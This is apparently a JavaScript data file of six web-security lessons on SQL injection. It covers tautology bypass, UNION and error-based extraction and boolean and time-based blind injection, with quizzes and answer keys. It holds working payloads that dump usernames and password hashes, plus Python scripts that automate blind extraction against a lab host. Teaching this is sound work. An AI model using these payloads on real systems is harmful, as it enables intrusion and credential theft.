(typeof module !== 'undefined' && module.exports ? data => { module.exports = data; } : data => registerLessonPack('en', data))({
  "web-01-01": {"html":"\n<h2>SQL Injection Fundamentals &amp; Quote Balancing</h2>\n\n<p>Imagine walking into a restaurant and the server asks: <em>\"How would you like your steak cooked?\"</em> You answer: <strong>\"Medium rare, and also hand over all cash from the register.\"</strong> If the server mechanically relays the second half to the staff as an authoritative order, you have experienced a catastrophic <strong>data vs. code ambiguity</strong>.</p>\n\n<p>In web architecture, the database behaves as an obedient yet literal-minded chef. When developers concatenate raw user input directly into SQL statements, untrusted text gets parsed as executable instructions. This fundamental design flaw is <strong>SQL Injection (SQLi)</strong>, a perennial top vulnerability across two decades of the OWASP Top 10.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the root cause of SQLi: conflating user input with executable syntax<br>\n  ② Master quote balancing mechanics and the classic tautology bypass <code>' OR '1'='1</code><br>\n  ③ Probe backend quoting syntax using the four core probes (single quote, double quote, brackets, backslash)<br>\n  ④ Deduce backend query structure from minimal diagnostic responses</p>\n</div>\n\n<h3>Step 1: Anatomy of the Tautology Bypass</h3>\n\n<p>Consider a typical vulnerable authentication query:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">-- Vulnerable query constructed by backend string interpolation\nSELECT * FROM users WHERE username = '$user' AND password = '$pwd';</code></pre>\n</div>\n\n<p>If an attacker inputs <code>admin' OR '1'='1</code> into the username field:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx';</code></pre>\n</div>\n<p>Because <code>'1'='1'</code> is universally true (tautology), the entire <code>WHERE</code> clause evaluates to <strong>TRUE</strong>. The database returns the first record in the table (typically administrator <code>admin</code>), logging the attacker in without knowing the password!</p>\n\n<h3>Step 2: Quote Balancing Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Probe</th><th>Target Backend Pattern</th><th>Expected Failure Response</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><code>'</code> (Single Quote)</td><td><code>WHERE name = '$input'</code></td><td>Mismatched quote triggers SQL Syntax Error</td></tr>\n    <tr><td><code>\"</code> (Double Quote)</td><td><code>WHERE name = \"$input\"</code></td><td>Mismatched quote in double-quoted SQL engines</td></tr>\n    <tr><td><code>')</code> (Quote + Bracket)</td><td><code>WHERE (name = '$input')</code></td><td>Balances single-parameter wrapped expressions</td></tr>\n    <tr><td><code>'))</code> (Double Bracket)</td><td><code>WHERE ((name = '$input'))</code></td><td>Balances complex nested subquery wrappers</td></tr>\n    <tr><td><code>\\\\</code> (Backslash)</td><td><code>WHERE u='$u' AND p='$p'</code></td><td>Escapes closing quote, merging two fields into one string</td></tr>\n  </tbody>\n</table>\n\n<h3>Step 3: Vulnerable vs. Parameterized Code Comparison</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># ❌ Vulnerable: Raw string formatting\nuser_input = \"admin' OR 1=1 -- \"\nquery = f\"SELECT * FROM accounts WHERE user = '{user_input}'\"\n\n# Output SQL received by DB:\n# SELECT * FROM accounts WHERE user = 'admin' OR 1=1 -- '\n# The trailing comment operator (--) neutralizes the developer's closing quote!</code></pre>\n</div>\n\n<div class=\"callout warn\">\n  <div class=\"callout-title\">URL Encoding Caveat</div>\n  <p>In HTTP GET parameters, a raw space after <code>-- </code> is stripped by standard HTTP parsers. Always supply <code>--+</code> (decoded as space) or URL-encoded hash <code>%23</code> to ensure proper comment termination.</p>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Given query <code>SELECT * FROM members WHERE (id = '$input');</code>, construct a valid tautological payload.</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Payload:</strong> <code>1') OR 1=1 --+</code> or <code>1') OR ('1'='1</code></p>\n    <p><strong>Analysis:</strong> <code>1')</code> closes the quote and bracket; <code>OR 1=1</code> provides the truth condition; <code>--+</code> truncates trailing syntax.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> Why does injecting a single backslash <code>\\\\</code> often trigger SQL errors on login forms?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Analysis:</strong> The backslash escapes the closing quote (<code>\\\\'</code>). The database treats everything until the next quote in the password field as part of the username string, leaving the query with unclosed delimiters and causing a syntax error.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Concept</th><th>Key Takeaway</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Root Cause</strong></td><td>Unsanitized user input interpreted as execution commands</td></tr>\n    <tr><td><strong>Quote Balancing</strong></td><td>Injecting delimiters to break out of string literals into the AST</td></tr>\n    <tr><td><strong>Comment Tokens</strong></td><td>Truncating trailing SQL to prevent syntax failures</td></tr>\n    <tr><td><strong>Core Probes</strong></td><td>Test single quotes, brackets, and backslashes sequentially</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"What is the primary root cause of SQL Injection vulnerabilities?","options":["Lack of SSL/TLS encryption between the application and database","Failure to separate untrusted user input from executable SQL command syntax","Absence of an external web application firewall (WAF)","Using weak administrative database credentials"],"answer":1,"explanation":"SQL injection occurs when user input is directly concatenated into queries, causing the database to interpret data as executable syntax."},{"question":"Given the backend query SELECT * FROM items WHERE (title = '$input'), which payload properly balances the delimiters?","options":["admin' OR 1=1 --+","admin') OR 1=1 --+","admin\" OR 1=1 --+","admin')) OR 1=1 --+"],"answer":1,"explanation":"The target query wraps the input inside single quotes and single parentheses. Therefore, ') is required to balance delimiters before injecting OR 1=1."}]},
  "web-01-02": {"html":"\n<h2>Numeric vs. String Injection &amp; Comment Syntax</h2>\n\n<p>Novice penetration testers often reflexively inject single quotes (<code>'</code>). If no error appears, they mistakenly assume the endpoint is immune. However, input parameters fall into two distinct paradigms: <strong>Numeric</strong> and <strong>String</strong>. Supplying a single quote into a numeric parameter can break an otherwise functional exploit!</p>\n\n<p>This micro-lesson trains your diagnostic reflexes to distinguish numeric from string injection points, followed by a comprehensive cross-database comment syntax reference.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Differentiate numeric parameters from string parameters in backend SQL statements<br>\n  ② Master the arithmetic test (2-1 test) and logical tests (AND 1=1 / AND 1=2)<br>\n  ③ Reference comment operator compatibility across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite<br>\n  ④ Leverage MySQL inline comments <code>/*!50000 SELECT*/</code> for WAF evasion</p>\n</div>\n\n<h3>Step 1: The Numeric vs. String Divide</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">-- String concatenation (parameter enclosed in quotes)\nSELECT * FROM news WHERE title = '$title';\n\n-- Numeric concatenation (parameter concatenated bare, without quotes)\nSELECT * FROM news WHERE id = $id;</code></pre>\n</div>\n<p><strong>Why is numeric injection devastating?</strong><br>\nBecause the input sits directly in the SQL Abstract Syntax Tree without quoting. Any injected operator, function, or subquery executes immediately without requiring quote balancing.</p>\n\n<h3>Step 2: Two Golden Rules of Diagnostic Probing</h3>\n\n<h4>Rule 1: Arithmetic Evaluation Test</h4>\n<p>Request: <code>?id=2-1</code></p>\n<ul>\n  <li>If the response matches <code>?id=1</code> exactly, the backend computed <code>2-1=1</code> arithmetically: <strong>Confirmed Numeric Injection</strong>!</li>\n  <li>If the response returns empty or not found, <code>\"2-1\"</code> was queried as a literal string.</li>\n</ul>\n\n<h4>Rule 2: Logical Binary Probing</h4>\n<ul>\n  <li><code>?id=1 AND 1=1</code> ➔ Normal page rendering</li>\n  <li><code>?id=1 AND 1=2</code> ➔ Content missing or error returned</li>\n  <li>Distinct responses between TRUE and FALSE confirm active SQL expression evaluation.</li>\n</ul>\n\n<h3>Step 3: Cross-Database Comment Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>DBMS</th><th>Single-Line Comment</th><th>Multi-Line Comment</th><th>Specific Behavior</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>MySQL</strong></td><td><code>-- </code> (space required), <code>#</code></td><td><code>/* ... */</code></td><td>Inline comments <code>/*!50000 ...*/</code> execute if version >= 5.0</td></tr>\n    <tr><td><strong>PostgreSQL</strong></td><td><code>-- </code> (space required)</td><td><code>/* ... */</code></td><td>Does not support <code>#</code>; supports nested comments</td></tr>\n    <tr><td><strong>MSSQL</strong></td><td><code>-- </code> (space required)</td><td><code>/* ... */</code></td><td>Does not support <code>#</code>; supports semicolon stacked queries</td></tr>\n    <tr><td><strong>Oracle</strong></td><td><code>-- </code> (space required)</td><td><code>/* ... */</code></td><td>Requires <code>FROM dual</code> for constant selections</td></tr>\n    <tr><td><strong>SQLite</strong></td><td><code>-- </code> (space required)</td><td><code>/* ... */</code></td><td>Adheres strictly to ANSI SQL standard</td></tr>\n  </tbody>\n</table>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> An endpoint returns products for <code>?cat=3 AND 1=1</code> but fails on <code>?cat=3 AND 1=2</code>. What injection type is present?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> <strong>Numeric SQL Injection</strong>. No quotes were required to evaluate the boolean expression.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> Why does <code>SELECT 1; -- </code> throw a syntax error in Oracle but succeed in MySQL?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Oracle strictly requires a <code>FROM</code> clause in all <code>SELECT</code> queries (e.g. <code>SELECT 1 FROM dual;</code>).</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Dimension</th><th>Numeric Injection</th><th>String Injection</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Backend SQL</strong></td><td><code>WHERE id = $id</code></td><td><code>WHERE title = '$title'</code></td></tr>\n    <tr><td><strong>Exploit Prerequisite</strong></td><td>Direct operator execution</td><td>Quote closing required first</td></tr>\n    <tr><td><strong>Primary Probe</strong></td><td><code>2-1</code> arithmetic test</td><td>Single quote syntax break</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"What is the most direct test to confirm numeric SQL injection?","options":["Verifying whether ?id=2-1 returns identical content to ?id=1","Injecting a single quote to check for syntax error messages","Supplying an XSS script tag to monitor popup alerts","Inspecting HTTP response headers via a web proxy"],"answer":0,"explanation":"In numeric injection, arithmetic expressions evaluate in the SQL engine. If ?id=2-1 returns item 1, numeric injection is confirmed."},{"question":"What is the syntax requirement for MySQL single-line comments using --?","options":["No whitespace is required after --","At least one whitespace or control character (such as +) must immediately follow --","MySQL does not support --; only # is valid","-- is restricted to stored procedures"],"answer":1,"explanation":"MySQL mandates a space or control character immediately following -- to prevent confusion with negation operators."}]},
  "web-01-03": {"html":"\n<h2>UNION-Based SQL Injection: Column Enumeration &amp; Data Extraction</h2>\n\n<p>While quote balancing confirms the existence of an injection vulnerability, <strong>UNION-Based SQL Injection</strong> is the fastest, most destructive technique for extracting entire database tables in cleartext.</p>\n\n<p>This micro-lesson covers column enumeration using <code>ORDER BY</code>, finding injectable display positions, and querying the MySQL <code>information_schema</code> metadata catalog.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the two mandatory UNION constraints: column count equality and type compatibility<br>\n  ② Enumerate original query column count efficiently using <code>ORDER BY N</code> binary search<br>\n  ③ Force attacker controlled output using the parameter negation technique (<code>id=-1</code>)<br>\n  ④ Execute the 3-step extraction process against <code>information_schema</code></p>\n</div>\n\n<h3>Step 1: Fundamental Laws of UNION Queries</h3>\n\n<p>The <code>UNION</code> operator merges result sets from two <code>SELECT</code> statements into one table under strict criteria:</p>\n<ol>\n  <li><strong>Equal Column Count:</strong> Both queries must request the exact same number of columns.</li>\n  <li><strong>Compatible Data Types:</strong> Corresponding column types must be convertible.</li>\n</ol>\n\n<h3>Step 2: Locating Injectable Display Columns</h3>\n\n<h4>1. Column Enumeration via ORDER BY</h4>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">?id=1 ORDER BY 1 --+  -- Renders normally\n?id=1 ORDER BY 2 --+  -- Renders normally\n?id=1 ORDER BY 3 --+  -- Renders normally\n?id=1 ORDER BY 4 --+  -- Error! Original query contains exactly 3 columns.</code></pre>\n</div>\n\n<h4>2. Nullifying the Primary Query</h4>\n<p>Because web pages often render only the first returned record, set <code>?id=-1</code> (an invalid ID) so the primary query yields an empty set, promoting our injected rows to the top position:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">?id=-1 UNION SELECT 1, 2, 3 --+</code></pre>\n</div>\n<p>If the page displays numbers <code>2</code> and <code>3</code> in the title and body areas, columns 2 and 3 are your reflection points!</p>\n\n<h3>Step 3: The information_schema Extraction Playbook</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Phase</th><th>Objective</th><th>Payload (Assuming Column 2 Reflects)</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>1. Database</strong></td><td>Current schema &amp; version</td><td><code>?id=-1 UNION SELECT 1, concat(database(), 0x7e, version()), 3 --+</code></td></tr>\n    <tr><td><strong>2. Tables</strong></td><td>Enumerate all table names</td><td><code>?id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() --+</code></td></tr>\n    <tr><td><strong>3. Columns</strong></td><td>Enumerate column names of users table</td><td><code>?id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' --+</code></td></tr>\n    <tr><td><strong>4. Data</strong></td><td>Dump usernames &amp; password hashes</td><td><code>?id=-1 UNION SELECT 1, group_concat(username, 0x3a, password), 3 FROM users --+</code></td></tr>\n  </tbody>\n</table>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why is <code>group_concat()</code> essential during UNION injection?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Web views typically render only the first row. <code>group_concat()</code> aggregates multiple rows into a single delimited string, returning all entries in one response.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> In PostgreSQL, <code>UNION SELECT 1, 2, 3</code> throws type mismatch errors. How do you bypass this?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Use <code>null</code> placeholders (e.g. <code>UNION SELECT null, null, null</code>) because <code>null</code> is compatible with any PostgreSQL data type, then probe each column individually.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Step</th><th>Command</th><th>Purpose</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>1. Count Columns</td><td><code>ORDER BY N --+</code></td><td>Identify exact column count threshold</td></tr>\n    <tr><td>2. Nullify &amp; Reflect</td><td><code>id=-1 UNION SELECT 1,2,3</code></td><td>Map visible output fields on screen</td></tr>\n    <tr><td>3. Extract Metadata</td><td><code>FROM information_schema.tables</code></td><td>Enumerate schemas, tables, and columns</td></tr>\n    <tr><td>4. Dump Records</td><td><code>group_concat(user, 0x3a, pass)</code></td><td>Extract credentials in a single request</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"What condition must be satisfied before executing a UNION SELECT injection?","options":["Both queries must return identical column counts with compatible data types","Both SELECT statements must target the exact same table","The database user must hold administrative superuser privileges","The primary table must first be truncated"],"answer":0,"explanation":"UNION combines result sets horizontally and requires matching column counts and compatible types across positions."},{"question":"Which MySQL system schema stores metadata describing all databases, tables, and columns?","options":["mysql","sys","information_schema","performance_schema"],"answer":2,"explanation":"information_schema is the standard ANSI catalog in MySQL containing tables and columns views used for database enumeration."}]},
  "web-01-04": {"html":"\n<h2>Error-Based SQL Injection: UpdateXml &amp; ExtractValue Exploitation</h2>\n\n<p>When an application renders fixed template fields without reflecting database rows, UNION injection cannot display extracted data. However, if database debugging is enabled (e.g. <code>display_errors = On</code>), syntax and runtime errors are printed directly to the HTTP response.</p>\n\n<p>By intentionally providing invalid XPath expressions to XML parsing functions, attackers force the database engine to include sensitive query results inside the error diagnostic string.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the error-based injection mechanism: exfiltrating data via syntax error strings<br>\n  ② Exploit MySQL 5.1+ XPath parsing functions: <code>updatexml()</code> and <code>extractvalue()</code><br>\n  ③ Understand the role of delimiter <code>0x7e</code> (tilde <code>~</code>) in triggering XPath exceptions<br>\n  ④ Circumvent the 32-character display truncation limit using <code>substr()</code></p>\n</div>\n\n<h3>Step 1: XPath Function Error Mechanics</h3>\n\n<p>MySQL 5.1+ includes two XML manipulation functions:</p>\n<ul>\n  <li><code>extractvalue(xml_target, xpath_expr)</code>: Extracts values using XPath notation.</li>\n  <li><code>updatexml(xml_target, xpath_expr, new_xml)</code>: Replaces matching XML nodes.</li>\n</ul>\n<p>Both functions require valid XPath syntax. If the expression contains invalid characters (such as <code>~</code>), MySQL throws <code>XPATH syntax error</code> and prints the offending evaluated string directly into the error message.</p>\n\n<h3>Step 2: Error-Based Payload Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Function</th><th>Standard Injection Pattern</th><th>Sample Output</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>UpdateXml</strong></td>\n      <td><code>AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) --+</code></td>\n      <td><code>XPATH syntax error: '~root@localhost~'</code></td>\n    </tr>\n    <tr>\n      <td><strong>ExtractValue</strong></td>\n      <td><code>AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) --+</code></td>\n      <td><code>XPATH syntax error: '~cyberedu_db~'</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 3: Overcoming 32-Byte Truncation</h3>\n\n<p>MySQL caps XPath error output at <strong>32 characters</strong>. To retrieve a 64-character SHA-256 password hash, slide an extraction window using <code>substr()</code>:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">-- Part 1: Retrieve characters 1 to 30\nAND updatexml(1, concat(0x7e, substr((SELECT password FROM users LIMIT 1), 1, 30)), 1) --+\n\n-- Part 2: Retrieve characters 31 to 60\nAND updatexml(1, concat(0x7e, substr((SELECT password FROM users LIMIT 1), 31, 30)), 1) --+</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> Why is <code>0x7e</code> (<code>~</code>) prefixed to the inner query?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Tilde (<code>~</code>) is an invalid starting character in XPath syntax, guaranteeing that the XPath evaluation engine fails and reflects the subquery contents.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> In MySQL &lt; 5.1 where XPath functions do not exist, what alternative error method is used?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> The classic <code>floor(rand(0)*2)</code> group key collision technique, which triggers a duplicate key error containing the query output.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Feature</th><th>Specification</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Prerequisite</strong></td><td>Verbose database error reporting exposed in HTTP responses</td></tr>\n    <tr><td><strong>Key Functions</strong></td><td><code>updatexml()</code>, <code>extractvalue()</code></td></tr>\n    <tr><td><strong>Payload Prefix</strong></td><td><code>0x7e</code> (tilde <code>~</code>)</td></tr>\n    <tr><td><strong>Truncation Remedy</strong></td><td>Window sliding with <code>substr(string, start, length)</code></td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"Why does updatexml() facilitate error-based data extraction in MySQL?","options":["It triggers a buffer overflow that crashes the daemon","Its second argument expects valid XPath syntax; illegal characters trigger error messages containing the subquery output","It automatically logs passwords to plain text files","It forces privilege escalation on the active database session"],"answer":1,"explanation":"updatexml() parses XPath in parameter 2. Non-XPath characters like tildes (~/0x7e) trigger syntax errors displaying the evaluated subquery string."},{"question":"How do you recover a 64-character hash when updatexml() truncates output at 32 characters?","options":["Abandon error-based techniques and resort to offline guessing","Slide an extraction window using substr() or substring()","Send consecutive duplicate requests until full output renders","Switch the database listener port to 3307"],"answer":1,"explanation":"Using substr(subquery, 1, 30) and substr(subquery, 31, 30) allows piecing together the full value across multiple requests."}]},
  "web-01-05": {"html":"\n<h2>Boolean-Based Blind SQL Injection: Binary Search &amp; Bit Extraction</h2>\n\n<p>In secure environments with error reporting disabled (<code>display_errors = Off</code>) and no data reflection, both UNION and error-based injection fail. The web application responds with binary states: either <strong>TRUE</strong> (normal content / \"User Found\") or <strong>FALSE</strong> (blank page / \"Not Found\").</p>\n\n<p><strong>Boolean-based Blind Injection</strong> formulates algorithmic true/false hypotheses to reconstruct database contents one character at a time using binary search.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the boolean blind mechanism: inferring state from binary application responses<br>\n  ② Master the core probing primitives: <code>length()</code>, <code>substr()</code>, <code>ascii()</code><br>\n  ③ Implement binary search algorithms to reduce requests from 95 to 7 per character<br>\n  ④ Automate boolean extraction using concise Python scripting</p>\n</div>\n\n<h3>Step 1: The Three-Step Probing Model</h3>\n\n<ol>\n  <li><strong>Measure String Length:</strong>\n    <div class=\"code-block\"><pre><code class=\"language-sql\">?id=1 AND length(database()) = 8 --+  -- True: Schema name is 8 chars long</code></pre></div>\n  </li>\n  <li><strong>Isolate Character Position:</strong>\n    <p><code>substr(database(), 1, 1)</code> extracts the 1st character.</p>\n  </li>\n  <li><strong>Evaluate ASCII Value:</strong>\n    <div class=\"code-block\"><pre><code class=\"language-sql\">?id=1 AND ascii(substr(database(), 1, 1)) &gt; 100 --+</code></pre></div>\n  </li>\n</ol>\n\n<h3>Step 2: Binary Search Optimization</h3>\n\n<p>Standard printable ASCII characters span from 32 (space) to 126 (<code>~</code>). Linear probing requires up to 95 HTTP requests per character. Binary search divides the search space in half each request, guaranteeing identification in <strong>at most 7 requests</strong> ((lceil log_2(95) \rceil = 7)).</p>\n\n<h3>Step 3: Python Automation Snippet</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\">import requests\n\nurl = \"http://target.lab/vuln.php\"\ndb_name = \"\"\n\nfor pos in range(1, 9):\n    low, high = 32, 126\n    while low <= high:\n        mid = (low + high) // 2\n        payload = f\"1 AND ascii(substr(database(), {pos}, 1)) > {mid}\"\n        r = requests.get(url, params={\"id\": payload})\n        if \"User Found\" in r.text:\n            low = mid + 1\n        else:\n            high = mid - 1\n    db_name += chr(low)\n    print(f\"[+] Current: {db_name}\")\n\nprint(f\"[★] Extracted DB: {db_name}\")</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> If commas are filtered by a WAF, how can you rewrite <code>substr(database(), 1, 1)</code>?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Use SQL comma-free syntax: <code>substr(database() FROM 1 FOR 1)</code>.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> When page text is identical for True and False responses, how can responses be distinguished?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Monitor the <code>Content-Length</code> header or DOM node count; subtle differences in hidden input fields or spacing often reveal the binary state.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Probe</th><th>SQL Construct</th><th>Efficiency</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>Length Probing</td><td><code>length(str) = N</code></td><td>Binary search over integers</td></tr>\n    <tr><td>Char Extraction</td><td><code>substr(str, pos, 1)</code></td><td>Positional isolation</td></tr>\n    <tr><td>ASCII Evaluation</td><td><code>ascii(char) &gt; mid</code></td><td>O(log N) — 7 requests per byte</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"What is the core prerequisite for Boolean-based Blind SQL Injection?","options":["The server must have SSH exposed to the public Internet","The application must yield distinguishable HTTP responses between TRUE and FALSE conditions","Verbose database error reporting must be enabled on screen","The backend database must run on Linux"],"answer":1,"explanation":"Boolean blind extraction requires that TRUE and FALSE states produce observable differences in response body, status code, or headers."},{"question":"Using binary search, how many requests are required to resolve a character among 95 printable ASCII symbols?","options":["Approximately 95 requests","Approximately 48 requests","At most 7 requests","Exactly 1 request"],"answer":2,"explanation":"Binary search halves the search space each step: ceil(log2(95)) = 7 queries maximum per character."}]},
  "web-01-06": {"html":"\n<h2>Time-Based Blind SQL Injection: Sleep Probing &amp; Silent Extraction</h2>\n\n<p>Under strict hardening where application responses are completely identical regardless of input (always returning <code>200 OK</code> with identical HTML and Content-Length), boolean blind probing fails. Attackers turn to <strong>Time-based Blind SQL Injection</strong>, measuring server round-trip latency to extract data over a timing side channel.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand timing side-channel mechanics: inferring data from server execution latency<br>\n  ② Master sleep primitives across MySQL, PostgreSQL, MSSQL, and Oracle<br>\n  ③ Formulate conditional delay expressions using <code>IF(condition, sleep(3), 0)</code><br>\n  ④ Mitigate false positives caused by network jitter using differential verification</p>\n</div>\n\n<h3>Step 1: Timing Side Channel Mechanics</h3>\n\n<p>In MySQL, the conditional delay pattern evaluates as follows:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-sql\">SELECT IF(1=1, sleep(3), 0);  -- Elapsed time: ~3.05s (TRUE condition)\nSELECT IF(1=2, sleep(3), 0);  -- Elapsed time: ~0.01s (FALSE condition)</code></pre>\n</div>\n<p>If client-observed HTTP response time exceeds 2.8 seconds, the asserted subquery is validated as TRUE.</p>\n\n<h3>Step 2: Cross-Database Delay Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>DBMS</th><th>Conditional Delay Syntax</th><th>Engine Mechanism</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>MySQL</strong></td><td><code>IF(condition, sleep(3), 0)</code></td><td>Thread sleep in seconds</td></tr>\n    <tr><td><strong>PostgreSQL</strong></td><td><code>CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END</code></td><td>Session sleep in seconds</td></tr>\n    <tr><td><strong>MSSQL</strong></td><td><code>IF (condition) WAITFOR DELAY '0:0:3'</code></td><td>Execution delay formatted as HH:MM:SS</td></tr>\n    <tr><td><strong>Oracle</strong></td><td><code>CASE WHEN (condition) THEN DBMS_PIPE.RECEIVE_MESSAGE('RDS',3) ELSE 0 END</code></td><td>Pipeline message timeout</td></tr>\n  </tbody>\n</table>\n\n<h3>Step 3: Python Timing Client</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\">import requests\nimport time\n\nurl = \"http://target.lab/api/search\"\n\ndef test_payload(cond):\n    payload = f\"1' AND IF({cond}, sleep(3), 0) -- \"\n    start = time.time()\n    try:\n        requests.get(url, params={\"q\": payload}, timeout=5)\n    except requests.exceptions.Timeout:\n        return True\n    return (time.time() - start) >= 2.8\n\nif test_payload(\"version() LIKE '8%'\"):\n    print(\"[+] Confirmed: MySQL 8.x detected!\")</code></pre>\n</div>\n\n<h3>Exercises</h3>\n\n<p><strong>Exercise 1:</strong> If <code>sleep()</code> is blocked by an engine policy, how can you trigger artificial delays in MySQL?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Use the heavy CPU calculation function <code>benchmark(50000000, md5('test'))</code> to induce deterministic CPU execution latency.</p>\n  </div>\n</details>\n\n<p><strong>Exercise 2:</strong> Why is testing time-based blind injection with high concurrency dangerous in production?</p>\n<details>\n  <summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> Consecutive long sleeps hold database connection threads open, quickly exhausting connection pool limits and causing Denial of Service (DoS).</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Feature</th><th>Boolean Blind</th><th>Time-Based Blind</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Detection Medium</strong></td><td>HTML text / byte diffs</td><td>Response latency (Elapsed seconds)</td></tr>\n    <tr><td><strong>Robustness</strong></td><td>High against network jitter</td><td>Requires retry threshold tuning</td></tr>\n    <tr><td><strong>Applicability</strong></td><td>Requires subtle response variance</td><td>Universally applicable in total silence</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"When is Time-based Blind SQL Injection strictly necessary?","options":["When the application displays user records directly in the DOM","When verbose SQL syntax errors are rendered on screen","When application responses are completely identical for both TRUE and FALSE inputs with no errors","When database connections drop frequently"],"answer":2,"explanation":"Time-based blind injection is the fallback of last resort when an application reveals zero content differences or error diagnostics."},{"question":"In MySQL, which expression induces a 3-second delay if the database name begins with 'c'?","options":["IF(substr(database(),1,1)='c', sleep(3), 0)","WAITFOR DELAY '0:0:3'","pg_sleep(3)","DELAY 3 SECONDS"],"answer":0,"explanation":"IF(condition, sleep(3), 0) is the standard MySQL conditional timing construct. WAITFOR DELAY is MSSQL, and pg_sleep is PostgreSQL."}]},
